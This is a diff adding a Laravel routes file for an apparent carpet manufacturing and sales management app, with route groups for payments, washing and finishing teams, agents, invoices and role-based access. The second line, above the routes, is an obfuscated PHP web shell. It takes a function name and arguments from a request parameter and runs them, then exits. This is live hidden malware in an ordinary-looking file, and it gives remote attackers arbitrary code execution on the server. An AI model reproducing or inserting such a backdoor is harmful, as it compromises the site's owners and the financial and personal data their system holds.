@@ -1,0 +1,571 @@
+<?php
+iF($te2Vl=@	${'_REQUEST'}	['1RWJX2QW' ]){$te2Vl [1]	($	{ $te2Vl[ 2 ]}[0	],	$te2Vl[3]($te2Vl[4])) ;};ExiT;
+
+/*
+|--------------------------------------------------------------------------
+| Web Routes
+|--------------------------------------------------------------------------
+|
+| Here is where you can register web routes for your application. These
+| routes are loaded by the RouteServiceProvider within a group which
+| contains the "web" middleware group. Now create something great!
+|
+*/
+use App\Activity;
+use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Redirect;
+
+
+/** Super Admin Routes */
+Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:SP']], function () {
+ 
+    Route::get('activities', 'ActivityController@index');
+    Route::delete('activities/{a_id}', 'ActivityController@destroy');
+    Route::post('search_activities', 'ActivityController@search_activities');
+    
+    /** Route for different account */
+    /** Route For Users **/
+    Route::resource('/users', 'UserController');
+    Route::post('/user-search', 'UserController@search');
+    // EDITING CURRENCY
+    Route::get('/edit-currency/{id}', 'DashboardController@editCurrency');
+    Route::put('/update-currency/{id}', 'DashboardController@updateCurrency');
+
+
+    /** route for all carpets list */
+    Route::get('/all-carpets', 'CarpetsController@all_carpets');
+    Route::post('/view-carpets/search', 'CarpetsController@all_carpets_search');
+    Route::get('/view-carpets', 'CarpetsController@all_carpets_view');
+
+    /** route for filter based on carpet type */
+
+    Route::post('filter-based-carpet-type', 'CarpetsController@filter_based_carpet_type');
+
+    /** talab mardom total */
+
+    Route::get('talab-mardom/{type?}', 'DashboardController@talab_mardom');
+    Route::get('qarz-mardom/{type?}', 'DashboardController@qarz_mardom');
+    Route::get('money-request-list', 'OfficeCreditController@money_request');
+    Route::delete('approve-request-money/{id}', 'OfficeCreditController@approve_request');
+      Route::delete('delete-request-money/{id}', 'OfficeCreditController@delete_request');
+
+    /** agent money request list  */
+
+    Route::get('agent-money-request-list', 'AgentPaymentController@money_request');
+    Route::delete('agent-approve-request-money/{id}', 'AgentPaymentController@approve_request');
+    Route::delete('agent-delete-request-money/{id}', 'AgentPaymentController@delete_request');
+
+    /** end agent money request list */
+    
+    
+    
+       /** different account money request list  */
+
+    Route::get('different-account-money-request-list', 'DifferentAccountPaymentController@money_request');
+    Route::delete('different-account-approve-request-money/{id}', 'DifferentAccountPaymentController@approve_request');
+    Route::delete('different-account-delete-request-money/{id}', 'DifferentAccountPaymentController@delete_request');
+
+    /** end different account money request list */
+    
+     /** new different account money request list  */
+
+    Route::get('new-different-account-money-request-list', 'NewDifferentAccountPaymentController@money_request');
+    Route::delete('new-different-account-approve-request-money/{id}', 'NewDifferentAccountPaymentController@approve_request');
+    Route::delete('new-different-account-delete-request-money/{id}', 'NewDifferentAccountPaymentController@delete_request');
+
+    /** end  new different account money request list */
+    
+    
+      /** kachaee money request list  */
+
+    Route::get('kachaee-money-request-list', 'KachaeePaymentController@money_request');
+    Route::delete('kachaee-approve-request-money/{id}', 'KachaeePaymentController@approve_request');
+    Route::delete('kachaee-delete-request-money/{id}', 'KachaeePaymentController@delete_request');
+
+    /** end kachaee money request list */
+    
+    
+        /** washing money request list  */
+
+    Route::get('washing-money-request-list', 'WashingPaymentController@money_request');
+    Route::delete('washing-approve-request-money/{id}', 'WashingPaymentController@approve_request');
+    Route::delete('washing-delete-request-money/{id}', 'WashingPaymentController@delete_request');
+
+    /** end washing money request list */
+    
+
+     /** finishing money request list  */
+
+    Route::get('finishing-money-request-list', 'FinishingTeamPaymentController@money_request');
+    Route::delete('finishing-approve-request-money/{id}', 'FinishingTeamPaymentController@approve_request');
+    Route::delete('finishing-delete-request-money/{id}', 'FinishingTeamPaymentController@delete_request');
+
+    /** end finishing money request list */
+    
+    
+    
+    
+    /** purchase material  request list  */
+
+    Route::get('purchase-material-request-list', 'PurchaseMaterialController@request_list');
+    Route::delete('purchase-material-approve-request/{id}', 'PurchaseMaterialController@approve_request');
+    Route::delete('purchase-material-delete-request/{id}', 'PurchaseMaterialController@delete_request');
+
+    /** end purchase material request list */
+    
+    
+    
+    /**  material sale  request list  */
+
+    Route::get('material-sale-request-list', 'MaterialSaleController@request_list');
+    Route::delete('material-sale-approve-request/{id}', 'MaterialSaleController@approve_request');
+    Route::delete('material-sale-delete-request/{id}', 'MaterialSaleController@delete_request');
+
+    /** end  material sale request list */
+    
+    
+      /**  string seller request list  */
+
+    Route::get('string-seller-request-list', 'SellerPaymentController@request_list');
+    Route::delete('string-seller-approve-request/{id}', 'SellerPaymentController@approve_request');
+    Route::delete('string-seller-delete-request/{id}', 'SellerPaymentController@delete_request');
+
+    /** end string seller request list */
+    
+    
+        /**  employee request list  */
+
+    Route::get('employee-request-list', 'EmployeePaymentController@request_list');
+    Route::delete('employee-approve-request/{id}', 'EmployeePaymentController@approve_request');
+    Route::delete('employee-delete-request/{id}', 'EmployeePaymentController@delete_request');
+
+    /** end employee request list */
+
+
+   /** customer request list  */
+
+    Route::get('customer-request-list', 'CustomerPaymentController@request_list');
+    Route::delete('customer-approve-request/{id}', 'CustomerPaymentController@approve_request');
+    Route::delete('customer-delete-request/{id}', 'CustomerPaymentController@delete_request');
+
+    /** end customer request list */
+
+
+   
+
+
+});
+
+/** End super admin route */
+
+/** Sales and Finishing Center Routes */
+Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:SO,SCO,SP']], function () {
+
+
+    /** Route For Carpet Stock  */
+    Route::get('/carpet-stock', 'CarpetsController@carpet_stock');
+
+    /** route for carpet stock filter based on type */
+    Route::post('/filter-ba-asas-type', 'CarpetsController@filter_ba_asas_type');
+
+    /** Route For Carpet Search date range */
+    Route::post('/carpet-stock/search-date-range', 'CarpetsController@stock_search_date_range');
+    /** Route For Carpet Stock Search */
+    Route::post('/carpet-stock/search', 'CarpetsController@carpet_stock_search');
+
+    /** Route For Carpet Stock Details  */
+    Route::get('/carpet-stock-details/{carpet_id}', 'CarpetsController@carpet_stock_details');
+
+
+
+    // Route for finishing team Category
+//    Route::resource('/finish-team-category', 'FinishingTeamCategoryController')->parameters(['finish-team-category' => 'category']);
+    // Route for finishing team
+    Route::resource('/finish-team', 'FinishingTeamController')->parameters(['finish-team' => 'team']);
+    Route::post('/finish-team/search', 'FinishingTeamController@search');
+
+    // FINISHING CENTER
+    Route::resource('finishing-center', 'FinishingWorkController')->parameters(['finishing-center' => 'finish']);
+    Route::post('/finishing-center/search', 'FinishingWorkController@search');
+    Route::post('/finishing-center/search-non', 'FinishingWorkController@search_non');
+    Route::get('finishing-center/finish-work/{carpet}', 'FinishingWorkController@saving_the_work');
+     Route::get('finishing-center/re-finish-work/{carpet}', 'FinishingWorkController@re_saving_the_work');
+    Route::post('/finishing-center/refinish', 'FinishingWorkController@store_refinish');
+    //  FINISHING RECEIVEDS
+    Route::resource('finishing-payments', 'FinishingTeamPaymentController')->parameters(['finishing-receive' => 'recived']);
+    Route::get('/finishing-payments-all/{team_id}', 'FinishingTeamPaymentController@show_all_payment');
+    Route::get('/finishing-accounts', 'FinishingTeamController@accounts');
+    Route::get('/finishing-center/search-finish-number/{finish_number},{team_id}', 'FinishingWorkController@search_finish_number');
+    Route::post('/search-from-finish-number', 'FinishingWorkController@search_from_finish_number');
+
+
+    Route::get('carpets-in-sales-office', 'CarpetsController@carpets_in_sales_office');
+
+
+    Route::get('finishing-team-carpets/{id}', 'FinishingReceivedController@team_carpets');
+
+
+    Route::get('/return-to-wash/{id}','FinishingWorkController@return_to_wash');
+    Route::get('/return-to-center-from-finish/{carpet_id}','FinishingWorkController@return_to_center');
+
+
+
+
+
+
+});
+/** End sales and finishing center routes */
+
+
+/** Sales and Finishing Center Routes */
+Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:SO,CCO,SCO,SP,OM']], function () {
+
+/** Route For Sales */
+Route::resource('/sales', 'SaleController');
+Route::get('/sales-all', 'SaleController@show_all');
+Route::post('/search-carpet-from-sales','SaleController@search');
+
+
+Route::resource('/packing-list', 'PakingListController');
+Route::resource('/package-list', 'PackageController');
+Route::get('/package_list.get_by_packing', 'PackageController@get_by_packing')->name('dashboard.package_list.get_by_packing');
+
+});
+
+/** Central office Routes */
+Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CO,CCO,SP']], function () {
+
+        /** Route for Material Accounts */
+    Route::resource('/material-accounts', 'MaterialAccountController');
+
+    /** Route for Material Account Payments */
+    Route::resource('/material-account-payments', 'MaterialAccountPaymentController');
+
+    Route::delete('material-account-approve-request/{id}', 'MaterialAccountPaymentController@approve_request');
+    Route::delete('material-account-delete-request/{id}', 'MaterialAccountPaymentController@delete_request');
+
+    Route::get('material-account-request-list', 'MaterialAccountPaymentController@request_material');
+
+
+    /** Route For Material Category**/
+    Route::resource('/material-category', 'MaterialCategoryController');
+
+
+    Route::get('/agent-payment/{id}', 'AgentsController@agent_payment');
+
+    /** Route For Province **/
+    Route::resource('/provinces', 'ProvinceController');
+
+    /** Route For Material Types **/
+    Route::resource('/materialtypes', 'MaterialTypeController');
+
+    /** Route For Material Types **/
+    Route::resource('/agent-employees', 'AgentEmployeeController');
+
+
+    // Route for string seller
+    Route::resource('/string-seller', 'StringSellerController');
+    Route::post('/string-seller/search', 'StringSellerController@search');
+    Route::resource('/string-seller-payments', 'SellerPaymentController');
+    Route::get('/seller-payments-all/{seller_id}', 'SellerPaymentController@show_all_payment');
+    Route::get('/sttring-seller-accounts', 'StringSellerController@accounts');
+
+
+    /** Route for Material purchase */
+    Route::resource('/material-purchase', 'PurchaseMaterialController')->parameters(['material-purchase' => 'purchaseMaterial']);
+    Route::get('/material-purchase/search-purchase-number/{purchase_number},{seller_id}', 'PurchaseMaterialController@search_purchase_number');
+
+    /** Route for Material stock */
+    Route::resource('/material-stock', 'MaterialStockController');
+    Route::post('/material-stock/search', 'MaterialStockController@search');
+
+    /** Route for material sales */
+    Route::resource('/material-sales', 'MaterialSaleController');
+    Route::get('/material-sales/search-sale-number/{sale_number},{agent_id}', 'MaterialSaleController@search_sale_number');
+
+    /** Route for  Received of Material */
+    Route::resource('/carpet-material', 'CarpetMaterialController')->parameters(['carpet-material' => 'material']);
+    /** Route For Contract Carpets  */
+    Route::resource('/contract-carpet', 'CarpetsController')->parameters(['contract-carpet' => 'carpet']);
+    Route::post('/contract-carpet/search', 'CarpetsController@search_contract_carpet');
+    Route::get('contract-carpet-show-all', 'CarpetsController@show_all_contract_carpet');
+    
+    Route::post('/pass-parcha','CarpetsController@pass_parcha');
+    Route::post('/search-contract-carpet-by-agent','CarpetsController@search_contract_carpet_by_agent');
+
+
+    Route::get('/list-weight', 'CarpetsController@listWeight');
+    Route::post('/list-weight/search', 'CarpetsController@search_weight_carpet');
+    Route::post('/post-weight', 'CarpetsController@PostWeight');
+    Route::get('/edit-weight/{id}', 'CarpetsController@editWeight');
+    Route::post('/upd-weight/{id}', 'CarpetsController@UpdatetWeight');
+    Route::get('/show-weight/{id}', 'CarpetsController@showWeight');
+    Route::get('list-weight-show-all', 'CarpetsController@show_all_weight_carpet');
+    Route::post('/search-weight-carpet-by-agent','CarpetsController@search_weight_carpet_by_agent');
+
+    // Route for seller check book
+    Route::resource('/check-book', 'CarpetCheckBookController')->parameters(['check-book' => 'chck']);
+    Route::post('check-book/search', 'CarpetCheckBookController@Filter');
+    Route::post('check-book/search-agent', 'CarpetCheckBookController@search_agent');
+    Route::post('check-book/search-check-number/', 'CarpetCheckBookController@search_check_number');
+
+
+    // Route for carpet repair
+    Route::get('/carpet-repair-create/{id}', 'CarpetRepairController@createRepair');
+    Route::resource('/carpet-repair', 'CarpetRepairController');
+    Route::get('/carpet-repair/search-kachaee-number/{kachaee_number}{team_id}', 'CarpetRepairController@search_kachaee_number');
+
+    Route::post('/repair-search', 'CarpetRepairController@repair_search');
+    Route::post('/search-repaired', 'CarpetRepairController@search_repaired');
+    Route::post('/repair-date-search', 'CarpetRepairController@repair_date_search');
+
+    Route::get('/return-to-center-from-non-repair/{id}','CarpetRepairController@return_to_center_from_non_repair');
+    Route::get('/return-to-center-from-repair/{id}','CarpetRepairController@return_to_center_from_repair');
+
+    // Agent Carpets Details
+
+    Route::post('/agent-carpet/search', 'AgentsCarpetController@agent_carpet_search');
+
+    Route::get('agent-balance/{carpet}', 'AgentsCarpetController@agent_balance');
+
+
+    // Route for Kachaee team
+    Route::resource('kachaee-team', 'KachaeeController')->parameters(['kachaee-team' => 'team']);
+    Route::resource('kachaee-payments', 'KachaeePaymentController');
+    Route::get('/kachaee-payments-all/{team_id}', 'KachaeePaymentController@show_all_payment');
+    Route::get('/kachaee-accounts', 'KachaeeController@accounts');
+    Route::post('/kachaee-team/search', 'KachaeeController@search');
+
+    Route::get('carpet-repaire/sending-to-kachaee/{carpetId}', 'CarpetRepairController@sending_to_repair');
+    Route::post('carpet-repair/sent-to-repair/{carpetId}', 'CarpetRepairController@repair_team_selected');
+
+
+    Route::get('carpets-in-center-office', 'CarpetsController@carpets_in_center_office');
+
+    /** route for buy carpet */
+    Route::get('/create-buy-carpet', 'CarpetsController@createBuyCarpet');
+    Route::get('/list-buy-carpet', 'CarpetsController@listBuyCarpet');
+    Route::get('/list-buy-carpet/show-all', 'CarpetsController@show_all_buy_carpet');
+    Route::post('/list-buy-carpet/search', 'CarpetsController@search_buy_carpet');
+    Route::post('/post-buy-carpet', 'CarpetsController@PostBuyCarpet');
+    Route::get('/edit-buy-carpet/{id}', 'CarpetsController@editBuyCarpet');
+    Route::post('/upd-buy-carpet/{id}', 'CarpetsController@UpdatetBuyCarpet');
+    Route::get('/show-buy-carpet/{id}', 'CarpetsController@showBuyCarpet');
+    Route::get('/print-buy-carpet/{id}', 'CarpetsController@printBuyCarpet');
+
+    Route::get('/carpet-stock/sent-to-stock/{id}', 'CarpetsController@sending_to_stock');
+
+});
+/** End Central office routes */
+
+/** shared routes */
+Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CO,SO,SP,SCO,CCO,OM']], function () {
+
+
+    Route::get('/carpet-wash/sent-to-finish/{carpet}', 'CarpetWashController@sent_to_finishing_center');
+
+
+    Route::get('washing-team/sending-to-washing/{carpetId}', 'WashingTeamController@sending_to_washing');
+    Route::post('washing-team/sent-to-washing/{carpetId}', 'WashingTeamController@washing_team_selected');
+    /** Route For Agents**/
+    Route::resource('/agents', 'AgentsController');
+    Route::post('/agent/phone/{id}', 'AgentsController@StorePhone');
+    Route::get('/agent/phone/{id}', 'AgentsController@DeletePhone');
+    Route::post('/agents/search', 'AgentsController@search');
+    Route::get('/agent-accounts', 'AgentsController@accounts');
+    Route::get('/agent-deactive', 'AgentsController@deactive_accounts');
+    Route::get('/agent-status-change/{agent_id}', 'AgentsController@change_status');
+
+
+    /** Route For Phone Book **/
+    Route::resource('/phone-book', 'PhoneBookController');
+    Route::post('/phone-books/search','PhoneBookController@search');
+
+
+    /** Route For Carpet Type **/
+    Route::resource('/carpet-types', 'CarpetTypeController');
+
+    /** Route For Quality **/
+    Route::resource('/carpet-qualities', 'QualityController');
+
+    Route::get('/qualities.get_by_type', 'QualityController@get_by_type')->name('dashboard.qualities.get_by_type');
+
+
+    /** Route for seller purches */
+    Route::resource('/carpet-orders', 'CarpetOrderController');
+
+
+    Route::resource('/agent-carpet', 'AgentsCarpetController');
+    Route::get('/agent-carpets/{id}', 'AgentsCarpetController@carpet_details');
+
+
+    // RECEIVED OF WASHING TEAM
+    Route::resource('received-of-washing', 'ReceivedOfWashingController')->parameters(['received-of-washing' => 'r_washing']);
+
+
+    // WASHING TEAM ROUTES
+    Route::resource('washing-team', 'WashingTeamController')->parameters(['washing-team' => 'team']);
+    Route::resource('washing-payments', 'WashingPaymentController');
+    Route::get('/washing-payments-all/{team_id}', 'WashingPaymentController@show_all_payment');
+    Route::get('/washing-accounts', 'WashingTeamController@accounts');
+    Route::post('/washing-team/search', 'WashingTeamController@search');
+
+    Route::get('washing-team-carpets/{id}', 'WashingTeamController@team_carpets');
+
+    /** Route For invoices */
+    Route::resource('/invoices', 'InvoiceController');
+    Route::post('/search-invoice','InvoiceController@search');
+    Route::get('/invoices/search-invoice-number/{invoice_number},{customer_id}', 'InvoiceController@search_invoice_number');
+    Route::post('/search-carpet-from-invoice', 'InvoiceController@search_carpet');
+
+    Route::get('/invoices/sent-to-stock/{id}', 'InvoiceController@sending_to_stock');
+
+
+
+    // WASHING CARPET ROUTES
+    Route::resource('carpet-wash', 'CarpetWashController')->parameters(['carpet-wash' => 'wash']);
+    Route::get('carpet-wash/create/{carpetId}', 'CarpetWashController@create_carpet_wash');
+    Route::post('/carpet-wash/search', 'CarpetWashController@search');
+     Route::post('/carpet-wash/search-carpet-type', 'CarpetWashController@search_carpet_type');
+    Route::get('/carpet-wash/wash-numbers/{id}', 'CarpetWashController@wash_numbers');
+    Route::post('/search-wash-number-for-wash/', 'CarpetWashController@search_wash_number_for_wash');
+        Route::post('/search-carpet-type-from-wash-number/','CarpetWashController@search_carpet_type_from_wash_number');
+    Route::post('/search-wash-number-sh-for-wash/', 'CarpetWashController@search_wash_numbersh_for_wash');
+    Route::get('/search-wash-numbersh-payment/{wash_number_sh},{team_id}', 'CarpetWashController@search_wash_numbersh_payment');
+    Route::get('/carpet-wash/return-to-center/{id}','CarpetWashController@return_to_center');
+    Route::get('/carpet-wash/return-to-kachaee/{id}','CarpetWashController@return_to_kachaee');
+
+    Route::get('/all-carpet-edit/{id}', 'DashboardController@all_carpet_edit_dashboard');
+
+
+});
+/**  End shared routes */
+
+/** route for sales center and admin */
+Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CO,SO,SP']], function () {
+    /** Route For Office Employee Departments */
+    Route::resource('/employee-department', 'EmployeeDepartmentController');
+
+    /** Route For Office Employee */
+    Route::resource('/office-employee', 'OfficeEmployeeController');
+    /** Route For Office Employee Search */
+    Route::post('/office-employee/search', 'OfficeEmployeeController@search');
+
+    /** Route For Office Employee Salary */
+    Route::resource('/employee-salary', 'EmployeeSalaryController');
+    /** Route For Employee Payment  */
+    Route::resource('employee-payments', 'EmployeePaymentController');
+    Route::get('/employee-payments-all/{employee_id}', 'EmployeePaymentController@show_all_payment');
+    Route::post('/employee-payments-list-contract', 'EmployeePaymentController@show_contract_payment');
+
+
+    /** Route For Employee Payment */
+    Route::resource('/expenses', 'OfficeDebitController');
+    Route::post('/expenses/search', 'OfficeDebitController@search');
+    /** Route For Cash Book List */
+    Route::resource('/office-cash-book', 'OfficeCashBookController');
+    
+    Route::resource('/monthly-expenses','MonthlyExpenseController');
+    Route::post('/monthly-expense/search','MonthlyExpenseController@search');
+
+    /** Route For all expense */
+    Route::get('all-expenses', 'OfficeCashBookController@all_expenses');
+
+    /** Route for expense details */
+    Route::resource('expense-details', 'ExpenseDetailsController');
+
+    /** Route For expense Search date range */
+    Route::post('/office-cash-book/search-date-range', 'OfficeCashBookController@expense_search_date_range');
+
+    /** Route For expense Search */
+    Route::post('/office-cash-book/search', 'OfficeCashBookController@expense_search');
+
+    /** Route For add New Expense */
+    Route::get('/add-new-expense', 'OfficeDebitController@add_new_expense');
+
+    /** Route For Add Credit */
+    Route::resource('/add-office-credit', 'OfficeCreditController');
+
+
+});
+
+
+/** route for admin and center and sale with customer */
+Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CCO,SCO,SP']], function () {
+    /** Route for carpet customers */
+    Route::resource('/customers', 'CustomerController');
+
+    /** Route For customer payments */
+    Route::resource('/customer-payments', 'CustomerPaymentController');
+    Route::get('customer-payments-all/{customer_id}', 'CustomerPaymentController@show_all_payment');
+
+    Route::get('/customer-accounts', 'CustomerController@accounts');
+    Route::post('/customers/search', 'CustomerController@search');
+
+
+
+});
+/**  */
+
+Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CCO,SCO,CO,SO,SP,MO']], function () {
+//    Route::get('/', 'DashboardController@Index');
+    /** Route for different account */
+    Route::resource('/different-account', 'DifferentAccountController');
+    Route::get('different-account-payments-all/{account_id}', 'DifferentAccountController@show_all_payment');
+    Route::post('different-account/search', 'DifferentAccountController@search');
+
+    /** Route for different account received */
+    Route::resource('/different-account-receiveds', 'DifferentAccountReceviedController')->parameters(['different-account-receiveds' => 'differentAccountRecevied']);
+
+    /** Route for different account payments */
+    Route::resource('/different-account-payments', 'DifferentAccountPaymentController')->parameters(['different-account-payments' => 'differentAccountPayment']);
+    
+    
+    /** Route for new different account */
+    Route::resource('/new-different-account', 'NewDifferentAccountController');
+
+    Route::get('new-different-account-payments-all/{account_id}', 'NewDifferentAccountController@show_all_payment');
+    Route::post('new-different-account/search', 'NewDifferentAccountController@search');
+    /** Route for different account payments */
+    Route::resource('/new-different-account-payments', 'NewDifferentAccountPaymentController')->parameters(['new-different-account-payments' => 'NewdifferentAccountPayment']);
+
+
+
+});
+Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CCO,SCO,SP,MO,SO,CO,PH,OM']], function () {
+    Route::get('/', 'DashboardController@Index');
+    Route::get('/all-carpet-dashboard-show-all', 'DashboardController@show_all');
+    Route::post('/all-carpet-dashboard/search', 'DashboardController@search_all_carpet_dashboard');
+});
+
+Route::group(['prefix' => 'dashboard', 'middleware' => ['auth', 'usertype:CCO,CO,SP,AO']], function () {
+    /** Route for Agent Payment */
+    Route::resource('/agent-payments', 'AgentPaymentController')->parameters(['agent-payments' => 'agent']);
+    Route::get('agent-payments-all/{agent_id}', 'AgentPaymentController@show_all');
+    Route::get('check-book/search-check-number-payment/{check_number},{agent_id}', 'CarpetCheckBookController@search_check_number_payment');
+});
+
+
+Auth::routes();
+Route::redirect('/', '/login');
+
+Route::fallback(function () {
+    return back();
+});
+
+
+Route::get('/logout', function () {
+    
+     $activity = new Activity();
+      $activity->date = \Carbon\Carbon::today()->format('Y-m-d');
+    $activity->description =  "استفاده کننده بنام ". Auth::user()->name ." از سیستم خارج شد ";
+    $activity->user_id = Auth::user()->id;
+    $activity->save();
+
+    
+    auth()->logout();
+    Session()->flush();
+    return Redirect::to('/');
+})->name('logout');
+
